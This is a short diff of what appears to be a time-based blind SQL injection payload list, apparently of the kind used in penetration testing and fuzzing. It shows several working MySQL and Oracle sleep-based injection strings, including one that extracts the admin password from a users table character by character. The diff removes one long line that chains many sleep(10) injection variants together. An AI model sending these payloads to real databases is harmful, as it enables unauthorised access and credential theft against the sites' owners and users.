@@ -1013,4 +1013,3 @@ AND sleep(10) AND ('kleiton'='kleiton
 SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' THEN dbms_lock.sleep(10) ELSE dbms_lock.sleep(0) END FROM dual
 (SELECT(0)FROM(SELECT(SLEEP(8)))a)
 'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(9) ELSE 0 END)XOR'Z
--1+or+1=((SELECT+1+FROM+(SELECT+sleep(10))A))(SELECT * FRM (SELECT(sleep(10)))YYYY)(SELECT * FROM (SELECT(sleep(10)))YYYY)#(SELECT * FROM (SELECT(sleep(10)))YYYY)--'+(select*from(select(sleep(10)))a)+'(select(0)from(select(sleep(10)))v)%2f'+(select(0)from(select(sleep(10)))v)+'"(select(0)from(select(sleep(10)))v)%2f*'+(select(0)from(select(sleep(10)))v)+'"+(select(0)from(select(sleep(10)))v)+"*%2f(select(0)from(select(sleep(10)))v)/*'+(select(0)from(select(sleep(10)))v)+'"+(select(0)from(select(sleep(10)))v)+"*/(select(0)from(select(sleep(10)))v)/*'+(select(0)from(select(sleep(10)))v)+'\"+(select(0)from(select(sleep(10)))v)+\"*/',''),/*test*/%26%26%09sleep(10)%09--+
